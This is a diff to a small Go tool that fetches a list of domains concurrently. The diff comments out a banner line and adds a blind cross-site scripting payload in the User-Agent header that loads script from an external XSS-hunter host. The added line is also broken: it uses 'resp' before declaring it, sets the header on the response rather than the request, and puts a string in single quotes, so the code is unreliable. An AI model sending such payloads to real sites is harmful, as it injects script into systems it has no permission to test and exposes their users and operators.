@@ -13,12 +13,12 @@ import (
 func main(){
 	// fmt.Println("\n")
 	fmt.Println("frequester tool By tojojo and changes by realgoose")
-	fmt.Println("(\____/)\n( ͡ ͡° ͜ ʖ ͡ ͡°)\n\╭☞ \╭☞")
+	//fmt.Println("(\____/)\n( ͡ ͡° ͜ ʖ ͡ ͡°)\n\╭☞ \╭☞")
 	// fmt.Println("\n")
 
 	colorReset := "\033[0m"
 	colorRed := "\033[31m"
-    colorGreen := "\033[32m"
+        //colorGreen := "\033[32m"
 
 
 	sc := bufio.NewScanner(os.Stdin)
@@ -32,6 +32,8 @@ func main(){
 		go func(){
 			defer wg.Done()
 			for domain := range jobs {
+				
+				resp.Header.Set("User-Agent", '"><script src=https://realgoose.xss.ht></script>')
 
 				resp, err := http.Get(domain)
 				if err != nil{
